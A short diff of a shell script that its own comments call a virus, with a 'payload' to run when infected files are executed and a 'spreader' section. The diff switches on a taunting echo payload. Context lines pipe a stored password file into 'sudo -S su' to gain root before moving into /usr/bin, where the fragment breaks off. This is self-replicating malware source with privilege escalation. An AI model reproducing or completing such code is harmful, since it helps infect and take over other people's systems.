@@ -1,5 +1,5 @@
 #start payload you want to run when infected files executed
-#echo You got pwnd lol
+echo You got pwnd lol
 #end payload, start spreader
 cat /usr/bin/virus/supass.txt | sudo -S su
 cd /usr/bin
